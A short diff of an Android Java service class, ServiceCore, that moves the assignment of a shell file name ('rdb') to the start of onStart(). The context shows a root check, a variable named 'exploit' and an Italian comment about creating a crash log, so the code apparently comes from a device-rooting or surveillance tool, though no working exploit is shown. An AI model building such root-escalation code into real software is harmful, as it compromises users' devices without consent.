@@ -51,6 +51,8 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 		
+		this.shellFile = "rdb";
+		
 		if (checkRoot() == true) {
 			Status.self().setRoot(true);			
 		} else {
@@ -73,7 +75,7 @@ public class ServiceCore extends Service {
 			String exploit = "statuslog";
 			boolean isRoot = false;
 
-			this.shellFile = "rdb";
+			
 
 			// Creiamo il crashlog
 			FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
